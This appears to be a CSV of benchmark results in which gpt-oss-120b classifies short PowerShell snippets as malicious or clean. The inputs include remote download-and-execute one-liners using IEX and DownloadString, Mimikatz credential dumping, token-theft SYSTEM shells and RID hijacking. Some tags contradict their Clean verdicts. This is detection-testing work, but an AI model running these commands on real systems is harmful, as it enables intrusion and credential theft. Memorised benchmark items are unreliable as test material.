model_name,description,is_malicious,reasoning,answer,tag,explain,input,total_tokens
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0250,Clean,"We need to produce JSON per schema. The script sets Windows Defender preferences. This is benign, maybe defensive. No malicious indicators. So classification Clean. Provide summary, evidence maybe none. But evidence array can be empty. Provide explain. Tag maybe ""DEFENSE_EVASION""? No, it's not evasion. It's legitimate. So tag maybe null or omitted. Schema requires properties: summary, evidence, explain, is_malicious, tag (optional?). Tag is required? In schema, tag is defined but not required. Only required fields: summary, is_malicious, explain. So we can omit tag or set null. Provide empty evidence array.

Let's craft.","{
  ""summary"": ""The script configures Windows Defender settings by enabling real‑time monitoring, behavior monitoring, script scanning, and automatic sample submission."",
  ""evidence"": [],
  ""explain"": ""All commands are legitimate Windows Defender configuration cmdlets (Set‑MpPreference) that adjust security preferences. No remote execution, credential access, persistence, obfuscation, or other malicious behaviors are present."",
  ""is_malicious"": ""Clean"",
  ""tag"": ""DEFENSE_EVASION""
}",,,"# Natural language intent:
# Enable various Windows Defender preferences, including runtime scanning and automatic sample submission.

Set-MpPreference -drtm $True ; Set-MpPreference -dbm $True ; Set-MpPreference -dscrptsc $True ; Set-MpPreference -dbaf $True
",1324
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0278,Clean,"We need to analyze the provided PowerShell content. It's a simple script that creates a new TCP client connection to a specified IP address. No obfuscation, no malicious behavior indicated. It's just establishing a TCP connection. Could be benign or used for legitimate purposes. No evidence of malicious activity like data exfiltration, command execution, etc. So classification likely ""Clean"" or ""Notreally"". According to guidelines, if no malicious indicators, classify as Clean. Provide summary, evidence (maybe none). But evidence array can be empty. Provide explain and is_malicious = ""Clean"". Tag maybe ""EXECUTION"" or none. Since clean, tag maybe omitted or null. But schema requires tag property? Not required. Only required fields: summary, is_malicious, explain. So we can omit tag and evidence optional. Provide empty evidence array.

Let's craft JSON.","{
  ""summary"": ""The script creates a new TCP client object to connect to a specified IP address."",
  ""evidence"": [],
  ""explain"": ""The code only instantiates a System.Net.Sockets.TCPClient with a user‑provided IP address. It contains no obfuscation, no remote command execution, no credential handling, persistence, or other typical malicious behaviors. By itself it is a benign network‑connection operation."",
  ""is_malicious"": ""Clean""
}",,,"# Natural language intent:
# Create a new TCP client connection to the specified IP address.

$client = New-Object System.Net.Sockets.TCPClient(""<IP address>"")
",1334
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0265,Malicious,"We need to analyze the provided PowerShell content. It's a command: Invoke-MS16135 -Command ""iex(New-Object Net.WebClient).DownloadString('http://google.com')""

We need to produce JSON with summary, evidence array, explain, is_malicious, tag.

We need to identify suspicious segments: use of Invoke-MS16135 (likely a custom function to exploit MS16-135 vulnerability), using iex (Invoke-Expression) to execute downloaded string from a URL (http://google.com). This is downloader, remote code execution, execution, possibly defense evasion. It's malicious.

Provide evidence: code segment ""Invoke-MS16135 -Command ..."" and inner ""iex(New-Object Net.WebClient).DownloadString('http://google.com')"" with tags: DOWNLOADER, EXECUTION, REMOTE_COMMAND_EXECUTION maybe.

Explain: It downloads and executes arbitrary code from remote URL, uses iex to execute, uses Net.WebClient, etc.

Tag overall: DOWNLOADER or EXECUTION.

is_malicious: Malicious.

Provide summary: script attempts to exploit MS16-135 to download and execute payload from remote URL.

Now produce JSON. Ensure required fields: summary, is_malicious, explain. evidence optional but we include.

Let's craft.","{
  ""summary"": ""The command attempts to exploit the MS16-135 vulnerability to download a script from a remote URL and execute it on the host."",
  ""evidence"": [
    {
      ""code"": ""Invoke-MS16135 -Command \""iex(New-Object Net.WebClient).DownloadString('http://google.com')\"""",
      ""code_explain"": ""Calls a custom function (Invoke‑MS16135) that likely triggers the MS16‑135 privilege‑escalation exploit. The –Command argument passes a string that is executed via iex, which creates a Net.WebClient object, downloads the raw content from http://google.com, and immediately runs it. This is classic downloader behavior combined with remote code execution."",
      ""tag"": ""DOWNLOADER""
    },
    {
      ""code"": ""iex(New-Object Net.WebClient).DownloadString('http://google.com')"",
      ""code_explain"": ""Uses Invoke‑Expression (iex) to execute whatever text is returned by DownloadString. DownloadString fetches data over HTTP without validation, allowing an attacker to supply arbitrary PowerShell code. This pattern is a well‑known technique for remote command execution and execution of untrusted payloads."",
      ""tag"": ""REMOTE_COMMAND_EXECUTION""
    }
  ],
  ""explain"": ""The script combines a known Windows privilege‑escalation exploit (MS16‑135) with a downloader that fetches and runs code from an external server. The use of iex to execute downloaded content is a clear indicator of malicious intent, providing both execution and potential persistence capabilities."",
  ""is_malicious"": ""Malicious"",
  ""tag"": ""DOWNLOADER""
}",,,"# Natural language intent:
# Invoke MS16-135 vulnerability to download and execute a payload from a specified URL.

Invoke-MS16135 -Command ""iex(New-Object Net.WebClient).DownloadString('http://google.com')""
",1676
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0254,Malicious,"We need to produce JSON with fields summary, evidence array, explain, is_malicious, tag. Analyze script: powershell.exe -nop -exec bypass -c ""IEX (New-Object Net.WebClient).DownloadString('http://exploitingurl.com/exeKern32.ps1')""

This is a downloader: uses -nop (no profile), -exec bypass (bypass execution policy), IEX (Invoke-Expression) to execute downloaded script from URL. This is malicious behavior: remote code execution, downloader, execution, defense evasion (execution policy bypass), obfuscation maybe not but still suspicious.

Provide evidence: code segment: ""IEX (New-Object Net.WebClient).DownloadString('http://exploitingurl.com/exeKern32.ps1')"" tag: DOWNLOADER or EXECUTION. Also the flags -nop -exec bypass tag: DEFENSE_EVASION.

Provide summary: script downloads and runs remote PowerShell script.

Explain: malicious because it fetches and executes code from external URL, bypasses execution policy, etc.

Tag: DOWNLOADER or EXECUTION. Choose general category: DOWNLOADER.

is_malicious: Malicious.

Now produce JSON. Ensure required fields: summary, is_malicious, explain. evidence array can be empty? Should include items. Provide required fields.

Let's craft.","{
  ""summary"": ""The command launches PowerShell with no profile and execution‑policy bypass, then downloads a script from http://exploitingurl.com/exeKern32.ps1 and executes it inline."",
  ""evidence"": [
    {
      ""code"": ""powershell.exe -nop -exec bypass -c \""IEX (New-Object Net.WebClient).DownloadString('http://exploitingurl.com/exeKern32.ps1')\"""",
      ""code_explain"": ""The flags `-nop` (no profile) and `-exec bypass` suppress user profile loading and bypass the PowerShell execution policy, a common defense‑evasion technique. The payload uses `IEX (New-Object Net.WebClient).DownloadString(...)` to fetch a script from a remote URL and immediately execute it, which is a classic downloader behavior that enables remote code execution."",
      ""tag"": ""DOWNLOADER""
    },
    {
      ""code"": ""-exec bypass"",
      ""code_explain"": ""Specifies the `Bypass` execution policy, allowing the script to run even if the system’s policy would block it. This is a direct attempt to evade built‑in PowerShell defenses."",
      ""tag"": ""DEFENSE_EVASION""
    },
    {
      ""code"": ""IEX (New-Object Net.WebClient).DownloadString('http://exploitingurl.com/exeKern32.ps1')"",
      ""code_explain"": ""`IEX` (Invoke‑Expression) evaluates the downloaded string as PowerShell code, providing remote command execution without writing the payload to disk, a technique often used by malware to stay stealthy."",
      ""tag"": ""EXECUTION""
    }
  ],
  ""explain"": ""The command downloads and runs code from an external server while bypassing PowerShell’s execution policy, which is a well‑known malicious pattern for initial compromise and further payload delivery."",
  ""is_malicious"": ""Malicious"",
  ""tag"": ""DOWNLOADER""
}",,,"# Natural language intent:
# Execute PowerShell with specific settings to download and execute a script from a specified URL.

powershell.exe -nop -exec bypass -c ""IEX (New-Object Net.WebClient).DownloadString('http://exploitingurl.com/exeKern32.ps1')""
",1785
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0290,Clean,"We need to produce JSON per schema. The script is just Compress-Archive with variables. No malicious behavior. So classification Clean. Provide summary, evidence empty array, explain it's benign. Tag maybe ""EXECUTION"" but not needed if clean. The schema requires properties: summary, is_malicious, explain, optionally evidence, tag. evidence can be empty array. Provide tag maybe null? Not required. Provide tag maybe ""EXECUTION"". But tag property defined as string, not required. Could include. Provide minimal.

Let's craft.","{
  ""summary"": ""The script uses the built‑in Compress-Archive cmdlet to create a ZIP archive from the specified input file(s) and write it to the given destination, overwriting any existing file."",
  ""evidence"": [],
  ""explain"": ""Compress-Archive is a legitimate PowerShell command for archiving files. The script contains no remote calls, credential handling, persistence mechanisms, obfuscation, or any other behavior associated with malicious activity."",
  ""is_malicious"": ""Clean"",
  ""tag"": ""EXECUTION""
}",,,"# Natural language intent:
# Compress the specified input files into a new archive at the specified destination with forced compression.

Compress-Archive -Path ${input_file} -DestinationPath ${output_file} -Force
",1282
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0279,Malicious,"We need to produce JSON per schema. Analyze script: It uses Get-Process wininit | Invoke-TokenManipulation -CreateProcess 'cmd.exe' -PassThru).WaitForExit()

Invoke-TokenManipulation is likely a function from PowerSploit or similar that manipulates tokens to spawn a process with elevated privileges (token stealing). This is a privilege escalation technique. It creates a new process (cmd.exe) using token of wininit (system). That's malicious behavior: privilege escalation, execution, possibly persistence if used later. So classification: Malicious.

Evidence: code segment: ""(Get-Process wininit | Invoke-TokenManipulation -CreateProcess 'cmd.exe' -PassThru).WaitForExit()"". Tag: PRIVILEGE_ESCALATION, EXECUTION, DEFENSE_EVASION maybe. Provide explanation.

No IOCs. Summary: script attempts to spawn cmd.exe with system token via wininit process.

Explain: uses token manipulation to bypass UAC, run as SYSTEM.

Return JSON with fields: summary, evidence array, explain, is_malicious, tag (maybe ""PRIVILEGE_ESCALATION"").

Make sure required fields: summary, is_malicious, explain. evidence optional but include.

Proceed.","{
  ""summary"": ""The script spawns a new cmd.exe process using the token of the privileged wininit process, then waits for that process to finish."",
  ""evidence"": [
    {
      ""code"": ""(Get-Process wininit | Invoke-TokenManipulation -CreateProcess 'cmd.exe' -PassThru).WaitForExit()"",
      ""code_explain"": ""The command enumerates the wininit process (a SYSTEM‑level service) and pipes it to the Invoke-TokenManipulation function (from PowerSploit/Empire). This function steals the wininit token and creates a new process (cmd.exe) with that token, effectively launching a command shell with SYSTEM privileges. The .WaitForExit() call blocks until the spawned shell exits. Token stealing and launching a high‑privilege process are classic privilege‑escalation and execution techniques used by attackers."",
      ""tag"": ""PRIVILEGE_ESCALATION""
    }
  ],
  ""explain"": ""The use of Invoke-TokenManipulation to create a SYSTEM‑level cmd.exe process is a clear indicator of privilege escalation and unauthorized command execution, which are malicious behaviors."",
  ""is_malicious"": ""Malicious"",
  ""tag"": ""PRIVILEGE_ESCALATION""
}",,,"# Natural language intent:
# Create a new process for 'cmd.exe' using token manipulation on the wininit process and wait for the process to exit.

(Get-Process wininit | Invoke-TokenManipulation -CreateProcess 'cmd.exe' -PassThru).WaitForExit()
",1597
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0286,Malicious,"We need to produce JSON per schema. The script is just a command line invoking powershell.exe with ExecutionPolicy Bypass, NoProfile, -File badProject.ps1. This is a typical execution of a script, but the content of badProject.ps1 is unknown. The provided content is just the command line. There's no malicious code visible. However, using ExecutionPolicy Bypass can be considered suspicious, but it's a common technique for attackers to bypass policy. However, without seeing the script, we cannot label as malicious. According to guidelines, we need to classify based on observable behavior. The command line itself is not malicious; it's just launching a script. Could be considered ""Likely"" because bypass indicates possible malicious intent, but we lack evidence. The instruction says if at least one malicious indicator present, classify as Malicious or Likely. ExecutionPolicy Bypass is a known evasion technique. So we can tag as DEFENSE_EVASION, OBFUSCATION maybe. Provide evidence: the -ExecutionPolicy Bypass flag. Provide explanation. Tag: DEFENSE_EVASION. Overall classification: Likely (since we don't know script content). Provide summary: The command runs a PowerShell script with bypass. Provide explain: The use of ExecutionPolicy Bypass indicates attempt to evade policy, but no further malicious code is visible. Tag: DEFENSE_EVASION. Provide evidence array with one item.

Now produce JSON.","{
  ""summary"": ""The command launches a PowerShell script (badProject.ps1) while bypassing the system's execution policy and without loading a user profile."",
  ""evidence"": [
    {
      ""code"": ""powershell.exe -ExecutionPolicy Bypass -NoProfile -File <badProject.ps1>"",
      ""code_explain"": ""The '-ExecutionPolicy Bypass' flag disables the configured PowerShell execution policy, allowing scripts to run even if they are blocked by policy. This is a common technique used to evade defenses and execute potentially malicious code. '-NoProfile' prevents loading of user profiles, reducing the chance of detection through profile scripts."",
      ""tag"": ""DEFENSE_EVASION""
    }
  ],
  ""explain"": ""The only observable behavior is the use of ExecutionPolicy Bypass, which is a known evasion technique. No malicious payload or further actions are visible in the provided content, so the script cannot be definitively classified as malicious."",
  ""is_malicious"": ""Likely"",
  ""tag"": ""DEFENSE_EVASION""
}",,,"# Natural language intent:
# Execute a PowerShell script named 'badProject.ps1' with specific execution settings.

powershell.exe -ExecutionPolicy Bypass -NoProfile -File <badProject.ps1>
",1574
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0302,Clean,"We need to analyze the provided PowerShell content: ""cscript ${vbScript}"". This is a command line invoking cscript with a variable placeholder. It's a simple command to execute a VBScript. No obvious malicious indicators. It's just executing a script; could be benign. No obfuscation, no network, no persistence, etc. So classification: likely Clean. Provide summary, evidence (maybe none). Since no suspicious code, evidence array empty. Explain it's benign. Tag maybe ""EXECUTION"" but not malicious. According to schema, evidence items optional? The required fields are summary, is_malicious, explain. Tag optional. Provide is_malicious ""Clean"". Provide explain: The script simply calls cscript to run a VBScript; no malicious behavior observed. Provide empty evidence array. Provide tag maybe ""EXECUTION"". Let's output JSON.","{
  ""summary"": ""The script invokes the Windows cscript interpreter to run a VBScript file referenced by the variable ${vbScript}."",
  ""evidence"": [],
  ""explain"": ""The command only launches a local VBScript via cscript without any indication of downloading code, accessing credentials, persisting, or evading defenses. No obfuscation, network activity, or privileged actions are present, so the content appears benign."",
  ""is_malicious"": ""Clean"",
  ""tag"": ""EXECUTION""
}",,,"# Natural language intent:
# Execute a VBScript using the cscript interpreter.

cscript ${vbScript}
",1325
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0299,Malicious,"We need to analyze the provided PowerShell content. The content is:

```
# Natural language intent:
# Perform RID Hijacking to impersonate the specified user (David) with the specified RID, password, and enable the impersonation.

Invoke-RIDHijacking -User David -RID 500 -Password Password1 -Enable
```

We need to produce JSON with summary, evidence, explain, is_malicious, tag.

We must identify suspicious behavior: RID hijacking is a privilege escalation technique (manipulating RID to impersonate a privileged account). The command uses a function Invoke-RIDHijacking which is not built-in; likely custom malicious function. This is definitely privilege escalation / credential access / defense evasion.

Thus classification: Malicious.

Provide evidence: the command line.

Tag: PRIVILEGE_ESCALATION (maybe also CREDENTIAL_ACCESS). Choose primary tag: PRIVILEGE_ESCALATION.

Provide summary: script attempts to hijack a RID to impersonate built-in Administrator (RID 500) using supplied password.

Explain: The command calls a custom function that likely manipulates SAM or token to impersonate user, which is malicious.

No other code.

Return JSON.

","{
  ""summary"": ""The script invokes a custom `Invoke-RIDHijacking` function to impersonate the built‑in Administrator account (RID 500) using a supplied password, which is a classic privilege‑escalation technique."",
  ""evidence"": [
    {
      ""code"": ""Invoke-RIDHijacking -User David -RID 500 -Password Password1 -Enable"",
      ""code_explain"": ""Calls a non‑standard PowerShell function that likely manipulates the Security Account Manager (SAM) or token privileges to replace the current security context with that of the target RID (500 = built‑in Administrator). Supplying a clear‑text password and the `-Enable` switch indicates an attempt to gain elevated rights, which is characteristic of RID hijacking attacks."",
      ""tag"": ""PRIVILEGE_ESCALATION""
    }
  ],
  ""explain"": ""The presence of a custom `Invoke-RIDHijacking` command that directly targets the Administrator RID and supplies a password demonstrates an intent to elevate privileges and impersonate a high‑privilege account, which is malicious behavior."",
  ""is_malicious"": ""Malicious"",
  ""tag"": ""PRIVILEGE_ESCALATION""
}",,,"# Natural language intent:
# Perform RID Hijacking to impersonate the specified user (David) with the specified RID, password, and enable the impersonation.

Invoke-RIDHijacking -User David -RID 500 -Password Password1 -Enable
",1568
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0316,Malicious,"We need to produce JSON per schema. Summarize: script downloads and executes remote script via Invoke-Expression, bypasses execution policy. Identify evidence: the command line with -ExecutionPolicy Bypass, Invoke-Expression, WebClient DownloadString. Tags: REMOTE_COMMAND_EXECUTION, DOWNLOADER, EXECUTION, DEFENSE_EVASION, OBFUSCATION maybe not. Provide explanation. is_malicious: Malicious. Tag: DOWNLOADER or EXECUTION? Choose ""DOWNLOADER"". Provide evidence array with each segment.

We need to include required fields: summary, is_malicious, explain. evidence optional but include.

Structure: properties: summary string, evidence array of objects with code, code_explain, tag. explain string, is_malicious enum, tag string (general category). Provide no additionalProperties.

Let's craft.

","{
  ""summary"": ""The command bypasses PowerShell's execution policy, downloads a script from a remote URL, and executes it with Invoke-Expression."",
  ""evidence"": [
    {
      ""code"": ""powershell.exe -ExecutionPolicy Bypass -NoProfile -Command \""Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://maliciousurl.com/malicious.ps1')\"""",
      ""code_explain"": ""The `-ExecutionPolicy Bypass` flag disables PowerShell's execution restrictions, allowing unsigned or malicious code to run. `New-Object System.Net.WebClient).DownloadString(...)` fetches a script from an external HTTP server, which is a classic downloader pattern. The downloaded string is then passed to `Invoke-Expression`, which interprets and runs the content as PowerShell code, providing remote code execution."",
      ""tag"": ""DOWNLOADER""
    },
    {
      ""code"": ""Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://maliciousurl.com/malicious.ps1')"",
      ""code_explain"": ""`Invoke-Expression` executes arbitrary PowerShell code contained in a string, effectively allowing the attacker to run any payload retrieved from the remote server. This is a direct remote command execution technique."",
      ""tag"": ""REMOTE_COMMAND_EXECUTION""
    },
    {
      ""code"": ""-ExecutionPolicy Bypass"",
      ""code_explain"": ""Bypassing the execution policy is a defense‑evasion technique that prevents PowerShell from blocking the execution of scripts that are not signed or are otherwise restricted."",
      ""tag"": ""DEFENSE_EVASION""
    }
  ],
  ""explain"": ""The script combines execution‑policy bypass, a network downloader, and `Invoke-Expression` to fetch and run arbitrary code from an external server, which is a well‑known malicious behavior pattern."",
  ""is_malicious"": ""Malicious"",
  ""tag"": ""DOWNLOADER""
}",,,"# Natural language intent:
# Download and execute a PowerShell script from a specified URL using Invoke-Expression with bypassed execution policy.

powershell.exe -ExecutionPolicy Bypass -NoProfile -Command ""Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://maliciousurl.com/malicious.ps1')""
",1677
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0318,Malicious,"We need to analyze the provided PowerShell content. It's a simple command: Set-PSReadLineOption -AddToHistoryHandler { return $false }

We need to produce JSON with required fields: summary, evidence (array), explain, is_malicious, tag (optional? required? The schema says tag is optional? It is defined but not required. We can include if malicious.)

We need to evaluate if malicious. This command disables adding commands to history. That's a defense evasion technique, but not necessarily malicious. It could be used by an attacker to hide their commands. However alone it's benign; could be used for privacy. No remote execution, no download, no credential access. It's a configuration change. Could be considered ""DEFENSE_EVASION"" if used maliciously, but the script alone is not malicious. According to guidelines, if script exhibits at least one malicious indicator, classify as Malicious or Likely. This is a potential defense evasion, but it's a single config change. I'd classify as Likely (suspicious) because disabling history can be used by attackers, but not definitively malicious. However the instruction says ""if the script exhibits at least one malicious or offensive PowerShell indicator listed above or other suspicious indicators, classify it as Malicious or Likely."" This is a suspicious indicator: defense evasion. So Likely.

Provide evidence: code segment and explanation, tag: DEFENSE_EVASION.

Provide summary: disables command history.

Explain: The script modifies PSReadLine to prevent commands from being recorded, which can be used to hide activity.

Tag: DEFENSE_EVASION.

is_malicious: Likely.

Now produce JSON.","{
  ""summary"": ""The script configures PSReadLine to stop recording entered commands in the PowerShell history."",
  ""evidence"": [
    {
      ""code"": ""Set-PSReadLineOption -AddToHistoryHandler { return $false }"",
      ""code_explain"": ""Uses Set-PSReadLineOption with the -AddToHistoryHandler parameter to supply a script block that always returns $false. This overrides the default handler that adds each command to the session history, effectively preventing any command from being logged. Suppressing command history is a known defense‑evasion technique that attackers use to hide their activity."",
      ""tag"": ""DEFENSE_EVASION""
    }
  ],
  ""explain"": ""While the command itself is a legitimate PowerShell configuration option, disabling command history is commonly employed by malicious actors to evade detection. The presence of this behavior without any benign context makes the script suspicious, but it does not on its own perform malicious actions such as downloading payloads or escalating privileges."",
  ""is_malicious"": ""Likely"",
  ""tag"": ""DEFENSE_EVASION""
}",,,"# Natural language intent:
# Set PowerShell ReadLine options to disable adding commands to the history.

Set-PSReadLineOption -AddToHistoryHandler { return $false }
",1630
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0319,Malicious,"We need to produce JSON per schema. Summarize, evidence array with code, explanation, tag. Determine malicious. The script clearly downloads and executes from malicious site, uses bypass, hidden window. So malicious. Tags: DOWNLOADER, EXECUTION, DEFENSE_EVASION, OBFUSCATION maybe not obfuscation but bypass. Provide evidence: the whole command. Also the use of -Exec Bypass, -NoP, -NonI, -W Hidden. Provide explanation. Tag could be ""DOWNLOADER"" or ""EXECUTION"". Choose primary tag maybe ""DOWNLOADER"". Provide is_malicious ""Malicious"". Also overall tag maybe ""DOWNLOADER"". Provide summary. Provide explain. Ensure JSON matches schema: properties summary, evidence (array of objects), explain, is_malicious, tag (optional? required? Not required per schema but we can include). Must include required fields: summary, is_malicious, explain. Provide evidence array possibly multiple items. Provide code strings exactly as in content. Provide code_explain. Provide tag per evidence. Provide overall tag. Let's craft.

","{
  ""summary"": ""The command runs PowerShell with execution policy bypass, hidden window, and downloads a script from http://malicious-site.com to execute it immediately."",
  ""evidence"": [
    {
      ""code"": ""powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \""Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-site.com')\"""",
      ""code_explain"": ""The command launches PowerShell with -NoP (NoProfile), -NonI (NonInteractive), -W Hidden (hidden window) and -Exec Bypass to circumvent the system's execution policy. It then uses Invoke-Expression on the result of (New-Object Net.WebClient).DownloadString(...), which fetches a script from a remote URL and executes it in memory. This pattern is a classic downloader/execution technique used by malware."",
      ""tag"": ""DOWNLOADER""
    },
    {
      ""code"": ""-Exec Bypass"",
      ""code_explain"": ""Specifies the ExecutionPolicy bypass flag, allowing the script to run even if the system policy would block it. This is a common defense‑evasion tactic."",
      ""tag"": ""DEFENSE_EVASION""
    },
    {
      ""code"": ""-W Hidden"",
      ""code_explain"": ""Runs the PowerShell process with a hidden window, preventing the user from seeing the activity. This is another defense‑evasion / stealth technique."",
      ""tag"": ""DEFENSE_EVASION""
    }
  ],
  ""explain"": ""The script explicitly downloads and executes code from an external, untrusted URL while bypassing execution policy and hiding its window, which are hallmark behaviors of malicious downloader payloads."",
  ""is_malicious"": ""Malicious"",
  ""tag"": ""DOWNLOADER""
}",,,"# Natural language intent:
# Execute a hidden PowerShell command with bypassed execution policy to download and execute a script from a specified malicious site.

powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command ""Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-site.com')""
",1704
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0332,Malicious,"We need to produce JSON per schema. Summarize: script uses Invoke-Command to remote execute a script block that downloads and executes a script from malicious URL. Identify evidence: Invoke-Command remote execution, IEX with DownloadString, Net.WebClient, remote URL. Tags: REMOTE_COMMAND_EXECUTION, DOWNLOADER, EXECUTION, DEFENSE_EVASION maybe. Provide explanation. Determine is_malicious: Malicious. Tag: likely ""REMOTE_COMMAND_EXECUTION"" or ""DOWNLOADER"". Provide evidence array with each segment.

We need to follow schema: properties: summary, evidence (array of objects with code, code_explain, tag), explain, is_malicious, tag (general category). Required: summary, is_malicious, explain. Provide those.

Let's craft.

","{
  ""summary"": ""The script remotely executes a PowerShell command on a target system that downloads and runs a script from an external URL."",
  ""evidence"": [
    {
      ""code"": ""Invoke-Command -ComputerName <target_system> -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('https://malicious_script.ps1') }"",
      ""code_explain"": ""Uses **Invoke-Command** to run code on a remote host (REMOTE_COMMAND_EXECUTION). The script block contains an **IEX (Invoke‑Expression)** of a string fetched via **Net.WebClient.DownloadString**, which retrieves a PowerShell script from an external URL and immediately executes it (DOWNLOADER + EXECUTION). This pattern is a classic attacker technique for delivering payloads to compromised machines."",
      ""tag"": ""REMOTE_COMMAND_EXECUTION""
    },
    {
      ""code"": ""IEX (New-Object Net.WebClient).DownloadString('https://malicious_script.ps1')"",
      ""code_explain"": ""Creates a **Net.WebClient** object to download raw PowerShell code from the internet and pipes it to **IEX**, which evaluates the downloaded string as PowerShell code. This bypasses file‑write detection and enables on‑the‑fly execution of malicious payloads (DOWNLOADER, EXECUTION, DEFENSE_EVASION)."",
      ""tag"": ""DOWNLOADER""
    }
  ],
  ""explain"": ""The script performs remote command execution and directly downloads and runs code from an untrusted external URL, a well‑known malicious behavior used for initial compromise and payload delivery. No legitimate defensive or administrative purpose is evident."",
  ""is_malicious"": ""Malicious"",
  ""tag"": ""REMOTE_COMMAND_EXECUTION""
}",,,"# Natural language intent:
# Invoke a potentially malicious script block on a target system.

Invoke-Command -ComputerName <target_system> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('https://malicious_script.ps1')}
",1600
openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0338,Malicious,"We need to produce JSON per schema. The content is a command line: powershell.exe -Command ""Invoke-Mimikatz -DumpCreds"". This is clearly malicious: invoking Mimikatz to dump credentials. So summary: script attempts to run Mimikatz to dump credentials. Evidence: the command line includes Invoke-Mimikatz -DumpCreds. Tag: CREDENTIAL_ACCESS, maybe also EXECUTION. Classification: Malicious. Tag field: maybe ""CREDENTIAL_ACCESS"". Provide evidence array with code and explanation.

We need to follow schema: properties: summary (string), evidence (array of objects with code, code_explain, tag). explain (string). is_malicious (enum). tag (string) general category.

We must include required fields: summary, is_malicious, explain. evidence optional but we include.

Let's craft.

","{
  ""summary"": ""The command launches PowerShell to execute the Invoke‑Mimikatz function with the -DumpCreds switch, which extracts plaintext credentials from memory."",
  ""evidence"": [
    {
      ""code"": ""powershell.exe -Command \""Invoke-Mimikatz -DumpCreds\"""",
      ""code_explain"": ""The command directly calls the Invoke‑Mimikatz module, a known PowerShell wrapper for the Mimikatz tool. The -DumpCreds argument instructs Mimikatz to read LSASS memory and output credential material (password hashes, clear‑text passwords, Kerberos tickets). This is a classic credential‑dumping technique used by attackers to harvest privileged credentials."",
      ""tag"": ""CREDENTIAL_ACCESS""
    }
  ],
  ""explain"": ""The script explicitly invokes a credential‑dumping tool (Mimikatz) via PowerShell, which is a well‑known malicious activity for stealing Windows credentials. No defensive or benign context is present, making the behavior clearly offensive."",
  ""is_malicious"": ""Malicious"",
  ""tag"": ""CREDENTIAL_ACCESS""
}",,,"# Natural language intent:
# Invoke Mimikatz to dump credentials using PowerShell.

powershell.exe -Command ""Invoke-Mimikatz -DumpCreds""
",1457
